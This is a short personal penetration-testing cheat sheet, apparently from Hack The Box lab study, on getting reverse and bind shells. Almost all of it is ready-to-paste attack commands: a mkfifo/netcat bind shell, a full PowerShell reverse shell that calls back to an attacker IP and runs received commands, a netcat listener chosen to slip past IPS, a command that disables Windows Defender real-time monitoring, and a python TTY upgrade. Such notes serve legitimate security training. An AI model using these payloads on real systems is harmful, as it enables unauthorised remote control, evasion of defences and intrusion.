---
title: "Shells"
date: 2024-02-27
summary: "reverse & bind shells:"
tags: ["shell-payloads", "shells"]
source: "keepnote"
---

reverse & bind shells:
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

[payloads:](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
- [nishang/Shells/Invoke-PowerShellTcp.ps1 at master · samratashok/nishang · GitHub](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

Bind Shell (generally worse cuase of IDS - listening for incoming that might be blocked)

Shell bin/bash linux
- rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f

Reverse Shell
- sarting listener of our terminal:

-
- nc -lvnp 0.0.0.0 443  (443 cause chances are low its blocked by ips)

-

- connecting from target:

-
- Windows PS: (win+r) im command prompt dann das:

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.31',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
-
-
-

- Windows AV deactivation. Run PS as admin -> then

-
-
- PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true

-

Get a functioning shell (TTY)
- python -c 'import pty; pty.spawn("/bin/sh")'
